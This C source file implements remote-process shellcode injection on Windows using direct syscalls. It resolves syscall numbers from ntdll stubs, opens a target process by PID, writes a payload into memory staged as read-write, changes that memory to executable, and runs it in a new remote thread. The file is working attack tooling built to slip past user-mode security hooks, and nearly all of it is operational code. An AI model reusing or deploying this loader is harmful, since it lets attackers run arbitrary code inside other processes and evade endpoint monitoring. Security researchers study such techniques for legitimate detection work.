#include "injection.h"

VOID PrettyFormat(
    _In_ LPCSTR FunctionName, 
    _In_ CONST NTSTATUS ErrorCode
) {
    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorCode);
    return;
}

VOID GetSyscallNumber(
    _In_  HMODULE NtdllHandle, 
    _In_  LPCSTR NtFunctionName,
    _Out_ PDWORD NtFunctionSSN
) {

    UINT_PTR NtFunctionAddress = 0;

    NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);
    if (0 == NtFunctionAddress) {
        PrettyFormat("GetProcAddress", GetLastError());
        return;
    }

    *NtFunctionSSN = ((PBYTE)(NtFunctionAddress + 0x4))[0];
    INFO("[0x%p] [0x%0.3lx] -> %s", (PVOID)NtFunctionAddress, *NtFunctionSSN, NtFunctionName);
    return;

}

BOOL DirectSyscallsInjection(
        _In_ CONST DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ CONST SIZE_T PayloadSize
) {

    BOOL      State         = TRUE;
    PVOID     Buffer        = NULL;
    HANDLE    ThreadHandle  = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle   = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten  = 0;
    NTSTATUS  Status        = 0;
    CLIENT_ID CID           = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA    = { sizeof(OA),  NULL };

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        PrettyFormat("GetModuleHandleW", GetLastError());
        return FALSE; 
    }
    OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);

    GetSyscallNumber(NtdllHandle, "NtOpenProcess", &g_NtOpenProcessSSN);
    GetSyscallNumber(NtdllHandle, "NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtProtectVirtualMemory", &g_NtProtectVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtCreateThreadEx", &g_NtCreateThreadExSSN);
    GetSyscallNumber(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
    GetSyscallNumber(NtdllHandle, "NtFreeVirtualMemory", &g_NtFreeVirtualMemorySSN);
    GetSyscallNumber(NtdllHandle, "NtClose", &g_NtCloseSSN);

    Status = NtOpenProcess(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtOpenProcess", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Status = NtAllocateVirtualMemory(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);

    Status = NtWriteVirtualMemory(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] wrote %zu-bytes to buffer", Buffer, BytesWritten);

    Status = NtProtectVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);

    Status = NtCreateThreadEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PrettyFormat("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;
    }

    OKAY("[0x%p] successfully created a thread!", ThreadHandle);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    Status = NtWaitForSingleObject(ThreadHandle, FALSE, NULL);
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);

CLEANUP:

    if (Buffer) {
        Status = NtFreeVirtualMemory(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PrettyFormat("NtFreeVirtualMemory", Status);
        }
        else {
            INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
        }
    }

    if (ThreadHandle) {
        NtClose(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        NtClose(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return State;

}